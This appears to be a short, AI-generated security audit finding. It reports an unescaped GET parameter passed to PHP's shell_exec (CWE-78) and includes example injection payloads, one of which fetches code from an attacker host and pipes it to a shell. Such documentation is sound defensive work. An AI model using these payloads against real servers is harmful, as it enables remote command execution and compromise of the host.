OS command injection via GET parameter passed to shell_exec

unresolvedcritical · model-8dba79 · CWE-78

$_GET['host'] is interpolated into a shell command string handed to shell_exec without escapeshellarg() or validation. Shell metacharacters let the attacker chain arbitrary commands, e.g. ?host=127.0.0.1;id or ?host=$(curl attacker|sh). The command output is echoed back, giving a full non-interactive remote shell as the web server user, which typically leads to complete host compromise.
